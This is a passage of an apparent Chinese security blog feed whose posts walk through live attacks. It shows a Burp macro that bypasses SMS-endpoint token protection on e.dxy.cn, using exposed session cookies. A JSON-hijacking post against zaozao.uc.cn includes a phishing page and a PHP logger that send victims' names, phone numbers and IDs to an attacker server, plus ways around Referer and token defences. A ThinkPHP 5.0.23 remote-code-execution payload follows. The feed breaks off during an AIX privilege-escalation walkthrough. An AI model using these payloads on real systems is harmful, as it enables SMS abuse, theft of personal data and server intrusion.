&lt;h3 id=&quot;官网下载原版&quot;&gt;&lt;a href=&quot;#官网下载原版&quot; class=&quot;headerlink&quot; title=&quot;官网下载原版&quot;&gt;&lt;/a&gt;官网下载原
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>burpsuite短信发送绕过Token保护</title>
    <link href="txf7.xyz/2019/02/26/burpsuite%E7%9F%AD%E4%BF%A1%E5%8F%91%E9%80%81%E7%BB%95%E8%BF%87Token%E4%BF%9D%E6%8A%A4/"/>
    <id>txf7.xyz/2019/02/26/burpsuite短信发送绕过Token保护/</id>
    <published>2019-02-26T08:08:51.000Z</published>
    <updated>2019-02-26T08:42:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一个请求"><a href="#第一个请求" class="headerlink" title="第一个请求"></a>第一个请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /broadcast/api/captcha/formtoken HTTP/1.1</span><br><span class="line">Host: e.dxy.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-XSRF-TOKEN: nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9</span><br><span class="line">Referer: https://e.dxy.cn/broadcast/my/info</span><br><span class="line">Cookie: _ga=GA1.2.1060500756.1551167330; _gid=GA1.2.754575247.1551167330; JUTE_BBS_DATA=468d0283c978f647baafac3640c770dd2aa5da94bc74a1b446454d24a95d73af2871dace5332d3a7b837df5cf119bcf072c2e546db6ae4b6a20263cc55b0dc7c0c3a0283673a8b2cefb17a58c9372082; route_e_broadcast=e49be6a222ecd36085950f667b0f5a8e; PHPSESSID=hn2enr413f1l32rt044fr2ssmpkj6jq7; XSRF-TOKEN=nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9; dxy_session=WkmMYza7i0khDNJXIapui8nIA4VTZhcIAbFfQsvo; Hm_lvt_585d79beabf9368e8c8bdcc5a01b3940=1551167386; Hm_lpvt_585d79beabf9368e8c8bdcc5a01b3940=1551167386; DXY_USER_GROUP=60; JUTE_TOKEN=23b5b865-4a56-42ad-b098-17cdbb1c4a28</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="第一个应答"><a href="#第一个应答" class="headerlink" title="第一个应答"></a>第一个应答</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Tue, 26 Feb 2019 07:56:52 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Cache-Control: private, must-revalidate</span><br><span class="line">pragma: no-cache</span><br><span class="line">expires: -1</span><br><span class="line">Set-Cookie: XSRF-TOKEN=nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9; expires=Wed, 13-Mar-2019 07:56:52 GMT; Max-Age=1296000; path=/</span><br><span class="line">Set-Cookie: dxy_session=WkmMYza7i0khDNJXIapui8nIA4VTZhcIAbFfQsvo; path=/</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;mh99xIcgSbHmUSyJOsCJsICPjMnJOjOBp8oPGdco&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="第二个请求"><a href="#第二个请求" class="headerlink" title="第二个请求"></a>第二个请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /broadcast/index/api-phoneCode HTTP/1.1</span><br><span class="line">Host: e.dxy.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-XSRF-TOKEN: nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9</span><br><span class="line">Referer: https://e.dxy.cn/broadcast/my/info</span><br><span class="line">Content-Length: 80</span><br><span class="line">Cookie: _ga=GA1.2.1060500756.1551167330; _gid=GA1.2.754575247.1551167330; JUTE_BBS_DATA=468d0283c978f647baafac3640c770dd2aa5da94bc74a1b446454d24a95d73af2871dace5332d3a7b837df5cf119bcf072c2e546db6ae4b6a20263cc55b0dc7c0c3a0283673a8b2cefb17a58c9372082; route_e_broadcast=e49be6a222ecd36085950f667b0f5a8e; PHPSESSID=hn2enr413f1l32rt044fr2ssmpkj6jq7; XSRF-TOKEN=nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9; dxy_session=WkmMYza7i0khDNJXIapui8nIA4VTZhcIAbFfQsvo; Hm_lvt_585d79beabf9368e8c8bdcc5a01b3940=1551167386; Hm_lpvt_585d79beabf9368e8c8bdcc5a01b3940=1551167386; DXY_USER_GROUP=60; JUTE_TOKEN=23b5b865-4a56-42ad-b098-17cdbb1c4a28</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">type=verify&amp;phone=13888888888&amp;formtoken=mh99xIcgSbHmUSyJOsCJsICPjMnJOjOBp8oPGdco</span><br></pre></td></tr></table></figure><h2 id="第二个应答"><a href="#第二个应答" class="headerlink" title="第二个应答"></a>第二个应答</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Tue, 26 Feb 2019 07:56:53 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Cache-Control: private, must-revalidate</span><br><span class="line">pragma: no-cache</span><br><span class="line">expires: -1</span><br><span class="line">Set-Cookie: XSRF-TOKEN=nM28ZosriejdFoCVNTR0v3C98YzN1Ra33OYiAka9; expires=Wed, 13-Mar-2019 07:56:53 GMT; Max-Age=1296000; path=/</span><br><span class="line">Set-Cookie: dxy_session=WkmMYza7i0khDNJXIapui8nIA4VTZhcIAbFfQsvo; path=/</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;,&quot;data&quot;:&#123;&quot;message&quot;:&quot;\u53d1\u9001\u6210\u529f&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="这是一个短信发送的接口，第一个请求接受token然后第二个请求再调用。立马可以想到使用burpsuite中的Macros"><a href="#这是一个短信发送的接口，第一个请求接受token然后第二个请求再调用。立马可以想到使用burpsuite中的Macros" class="headerlink" title="这是一个短信发送的接口，第一个请求接受token然后第二个请求再调用。立马可以想到使用burpsuite中的Macros"></a>这是一个短信发送的接口，第一个请求接受token然后第二个请求再调用。立马可以想到使用burpsuite中的Macros</h4><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c459019861eae8ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Macros"></p><h2 id="录制宏"><a href="#录制宏" class="headerlink" title="录制宏"></a>录制宏</h2><p><img src="https://upload-images.jianshu.io/upload_images/14134003-0edea79947e18df4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="录制宏"></p><h2 id="编辑宏"><a href="#编辑宏" class="headerlink" title="编辑宏"></a>编辑宏</h2><p><img src="https://upload-images.jianshu.io/upload_images/14134003-0026641755eb28a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="编辑宏"><br><img src="https://upload-images.jianshu.io/upload_images/14134003-456e7e18080809a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="添加新规则"><a href="#添加新规则" class="headerlink" title="添加新规则"></a>添加新规则</h2><p><a href="https://upload-images.jianshu.io/upload_images/14134003-dc4880295e5d7fc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="noopener"></a><br><img src="https://upload-images.jianshu.io/upload_images/14134003-0548eafa5c26588a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c484cf10052daf74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-5dacc2e30c064e27.gif?imageMogr2/auto-orient/strip" alt="效果图片"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一个请求&quot;&gt;&lt;a href=&quot;#第一个请求&quot; class=&quot;headerlink&quot; title=&quot;第一个请求&quot;&gt;&lt;/a&gt;第一个请求&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>json hijacking</title>
    <link href="txf7.xyz/2019/01/12/json-hijacking/"/>
    <id>txf7.xyz/2019/01/12/json-hijacking/</id>
    <published>2019-01-12T12:18:07.000Z</published>
    <updated>2019-01-12T13:38:42.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="发现一个接口返回json格式的敏感数据"><a href="#发现一个接口返回json格式的敏感数据" class="headerlink" title="发现一个接口返回json格式的敏感数据"></a>发现一个接口返回json格式的敏感数据</h4><p><img src="https://upload-images.jianshu.io/upload_images/14134003-ccd4c3908e1ed7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="可以直接写出POC"><a href="#可以直接写出POC" class="headerlink" title="可以直接写出POC"></a>可以直接写出POC</h4><p>1.alert型(poc)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function txf(a)&#123;</span><br><span class="line">alert(a.data.nickname);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=http://zaozao.uc.cn/wm/User/getUserInfo?callback=txf&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-daaa5e74b4ba9b56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>2.textarea型(poc)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;txf&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.2.1/jquery.js&quot;&gt;&lt;/script&gt;&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">   $(document).ready(function () &#123;</span><br><span class="line">   $.ajax(&#123;</span><br><span class="line">   url: &quot;http://zaozao.uc.cn/wm/User/getUserInfo&quot;,</span><br><span class="line">   type: &quot;GET&quot;,</span><br><span class="line">   dataType: &quot;jsonp&quot;,</span><br><span class="line">   success: function(data) &#123;</span><br><span class="line">   var result = JSON.stringify(data);</span><br><span class="line">   $(&quot;#text&quot;).val(result);</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">   );</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;textarea id=&quot;text&quot; style=&quot;width: 400px; height: 100px;&quot;&gt;&lt;/textarea&gt;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-6da7082a9e898259.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="补充详细利用过程"><a href="#补充详细利用过程" class="headerlink" title="补充详细利用过程"></a>补充详细利用过程</h4><p>1.服务器搭建php服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nickname=$_GET[&apos;nickname&apos;];</span><br><span class="line">$mobile=$_GET[&apos;mobile&apos;];</span><br><span class="line">$ucid=$_GET[&apos;ucid&apos;];</span><br><span class="line">$fp = fopen(&apos;info.txt&apos;,&apos;a&apos;);</span><br><span class="line">$flag = fwrite($fp, &quot;名字:  &quot;.$nickname.&quot;, 手机号：&quot;.$mobile.&quot;, 用户id：&quot;.$ucid.&quot;\r\n&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>2.服务器钓鱼链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;txf&lt;/title&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var xmlhttp;</span><br><span class="line">    function wooyun(a)</span><br><span class="line">    &#123;</span><br><span class="line">    xmlhttp=new XMLHttpRequest()</span><br><span class="line">var x=&quot;http://192.168.2.104/json/json.php?nickname=&quot;+a.data.nickname+&quot;&amp;mobile=&quot;+a.data.mobile+&quot;&amp;ucid=&quot;+a.data.ucid;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;, x, true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;&gt;</span><br><span class="line">&lt;script src=http://zaozao.uc.cn/wm/User/getUserInfo?callback=wooyun&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;textarea&gt;json&lt;/textarea&gt;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>3.钓鱼成功<br><img src="https://upload-images.jianshu.io/upload_images/14134003-44b26cf9374e6a22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="绕过防御"><a href="#绕过防御" class="headerlink" title="绕过防御"></a>绕过防御</h4><p>1.Referer 过滤（正则）不严谨<br>比如 <a href="http://www.qq.com/login.php?calback=cb" target="_blank" rel="noopener">http://www.qq.com/login.php?calback=cb</a> 输出数据时,使用了 Referer 过滤。但是可惜过滤的时候只过滤了 Referer 里是否存在 qq.com 这样的关键词，那么攻击者可以听过构造 URL：<a href="http://www.qq.com.attack.com/attack.htm" target="_blank" rel="noopener">http://www.qq.com.attack.com/attack.htm</a>  或者 <a href="http://www.attack.com/attack.htm?qq.com" target="_blank" rel="noopener">http://www.attack.com/attack.htm?qq.com</a> 这样的页面来发起攻击实现绕过 Referer 防御。<br>2.空 Referer<br>在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。恰恰也就是这个忽视，导致了整个防御的奔溃。因为在通过跨协议调用 js 时，发送的 http 请求里 Referer 为空！ 跨协议调用的一个简单例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:&apos;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;/script&gt;&lt;script src=http://www.qq.com/login.php?calback=JSON&gt;&lt;/script&gt;&apos;&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p><p>代码里我们使用 <iframe> 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件。</iframe></p><p>另外一种防御手段就是通过随机 token 来防御，这个技术在 qq 的网站上应用比较多，如：<a href="http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=[QQ号码]&amp;g_tk=[随机token]" target="_blank" rel="noopener">http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=[QQ号码]&amp;g_tk=[随机token]</a> 来输出 JSON ，同样这个方案也是效的，但是同样可以出现防御实现的不严谨问题。如这个 token 可以暴力。如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function _Callback(o) &#123;</span><br><span class="line">    alert(o.items[0].uin);</span><br><span class="line">&#125;</span><br><span class="line">for (i = 17008; i &lt; 17009; i++) &#123; //暴力循环调用</span><br><span class="line">    getJSON(&quot;http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=1111111&amp;g_tk=&quot; + i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;发现一个接口返回json格式的敏感数据&quot;&gt;&lt;a href=&quot;#发现一个接口返回json格式的敏感数据&quot; class=&quot;headerlink&quot; title=&quot;发现一个接口返回json格式的敏感数据&quot;&gt;&lt;/a&gt;发现一个接口返回json格式的敏感数据&lt;/h4&gt;&lt;p&gt;&lt;i
      
    
    </summary>
    
      <category term="漏洞利用" scheme="txf7.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>thinkphp5.0.23rce</title>
    <link href="txf7.xyz/2019/01/11/thinkphp5-0-23rce/"/>
    <id>txf7.xyz/2019/01/11/thinkphp5-0-23rce/</id>
    <published>2019-01-11T12:26:55.000Z</published>
    <updated>2019-01-11T12:31:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p></blockquote><h2 id="poc测试"><a href="#poc测试" class="headerlink" title="poc测试"></a>poc测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.109:8080/index.php?s=captcha</span><br><span class="line">POST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c8838196218c1801.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.0.23rce"></p><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;poc测试&quot;&gt;
      
    
    </summary>
    
      <category term="漏洞利用" scheme="txf7.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>AIX的渗透</title>
    <link href="txf7.xyz/2019/01/09/aix/"/>
    <id>txf7.xyz/2019/01/09/aix/</id>
    <published>2019-01-09T08:08:51.000Z</published>
    <updated>2019-01-09T08:12:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一句话连接上去发现是我没遇到过的操作系统（AIX），记录一下学习过程</p><h2 id="查看内核"><a href="#查看内核" class="headerlink" title="查看内核"></a>查看内核</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[/]$ uname -a</span><br><span class="line">AIX rafiki 1 7 00C081F54C00</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[/]$ oslevel -s</span><br><span class="line">7100-02-02-1316</span><br></pre></td></tr></table></figure><blockquote><p>7&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 100&nbsp; &nbsp;&nbsp;  &nbsp;  &nbsp; 02&nbsp; &nbsp; &nbsp; 02&nbsp; &nbsp; &nbsp; 1316<br>version  &nbsp;    release &nbsp;     &nbsp;  TL       &nbsp; &nbsp;    SP    &nbsp; &nbsp; &nbsp;           CSP</p></blockquote><h2 id="查看Rpm已安装软件包"><a href="#查看Rpm已安装软件包" class="headerlink" title="查看Rpm已安装软件包"></a>查看Rpm已安装软件包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[/usr/local/tomcat6.0-j6/bin/]$ rpm -qa</span><br><span class="line">popt-1.16-1</span><br><span class="line">tcl-8.4.7-3</span><br><span class="line">tk-8.4.7-3</span><br><span class="line">expect-5.42.1-3</span><br><span class="line">unzip-5.51-1</span><br><span class="line">libidn-1.22-1</span><br><span class="line">gettext-0.17-5</span><br><span class="line">gmp-5.0.2-1</span><br><span class="line">coreutils-8.12-1</span><br><span class="line">AIX-rpm-7.1.1.0-3</span><br><span class="line">tar-1.26-1</span><br><span class="line">screen-4.0.3-1</span><br><span class="line">sudo-1.6.9p23-1</span><br><span class="line">libiconv-1.14-2</span><br><span class="line">bash-4.3-12</span><br><span class="line">rsync-3.1.1-1</span><br><span class="line">less-466-1</span><br></pre></td></tr></table></figure><h2 id="查找提权EXP"><a href="#查找提权EXP" class="headerlink" title="查找提权EXP"></a>查找提权EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/# searchsploit AIX | grep &quot;Privilege Escalation&quot; --color</span><br><span class="line">AIX 4.3/5.1 &lt; 5.3 - &apos;lsmcode&apos; Execution Privilege Escalation           | exploits/aix/local/701.sh</span><br><span class="line">AIX 5.2 - &apos;ipl_varyon&apos; Local Privilege Escalation                      | exploits/aix/local/1045.c</span><br><span class="line">AIX 5.2 - &apos;netpmon&apos; Local Privilege Escalation                         | exploits/aix/local/1044.c</span><br><span class="line">AIX 5.2 - &apos;paginit&apos; Local Privilege Escalation                         | exploits/aix/local/1046.c</span><br><span class="line">AIX 7.1 - &apos;lquerylv&apos; Local Privilege Escalation                        | exploits/aix/local/38576.sh</span><br><span class="line">AIX lquerylv - Local Buffer Overflow / Local Privilege Escalation      | exploits/aix/local/335.c</span><br><span class="line">Digital Ultrix 4.0/4.1 - &apos;/usr/bin/chroot&apos; Local Privilege Escalation  | exploits/aix/local/19041.txt</span><br><span class="line">IBM AIX 3.2.5 - &apos;IFS&apos; Local Privilege Escalation                       | exploits/aix/local/19344.sh</span><br><span class="line">IBM AIX 3.2.5 - &apos;login(1)&apos; Privilege Escalation                        | exploits/aix/remote/19348.txt</span><br><span class="line">IBM AIX 4.3 - &apos;infod&apos; Local Privilege Escalation                       | exploits/aix/local/19287.c</span><br><span class="line">IBM AIX 5.3 SP6 - Capture Terminal Sequence Privilege Escalation       | exploits/aix/local/4231.c</span><br><span class="line">IBM AIX 5.3 SP6 - FTP &apos;gets()&apos; Local Privilege Escalation              | exploits/aix/local/4233.c</span><br><span class="line">IBM AIX 5.3.0 - &apos;setlocale()&apos; Local Privilege Escalation               | exploits/aix/local/4612.py</span><br><span class="line">IBM AIX 5.3/6.1/7.1/7.2 - &apos;lquerylv&apos; Local Privilege Escalation        | exploits/aix/local/40710.sh</span><br><span class="line">IBM AIX 5.x - &apos;Diag&apos; Local Privilege Escalation                        | exploits/aix/local/25039.txt</span><br><span class="line">IBM AIX 6.1/7.1 - Local Privilege Escalation                           | exploits/aix/local/28507.sh</span><br><span class="line">IBM AIX 6.1/7.1/7.2 - &apos;Bellmail&apos; Local Privilege Escalation            | exploits/aix/local/40950.sh</span><br><span class="line">IBM AIX 6.1/7.1/7.2.0.2 - &apos;lsmcode&apos; Local Privilege Escalation         | exploits/aix/local/40709.sh</span><br><span class="line">SGI IRIX 5.1/5.2 - &apos;sgihelp&apos; Local Privilege Escalation                | exploits/aix/local/19354.txt</span><br><span class="line">SunOS 4.1.1 - &apos;/usr/release/bin/winstall&apos; Local Privilege Escalation   | exploits/aix/local/19043.txt</span><br><span class="line">SunOS 4.1.3 - &apos;/etc/crash&apos; SetGID kmem Privilege Escalation            | exploits/aix/local/19045.txt</span><br><span class="line">Xorg X11 Server (AIX) - Local Privilege Escalation                     | exploits/aix/local/45938.pl</span><br><span class="line">root@kali:/#</span><br></pre></td></tr></table></figure><h2 id="复制EXP"><a href="#复制EXP" class="headerlink" title="复制EXP"></a>复制EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/aix/local/28507.sh /1.sh</span><br><span class="line">cp /usr/share/exploitdb/exploits/aix/local/40710.sh /2.sh</span><br></pre></td></tr></table></figure><p>##查看系统详细命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 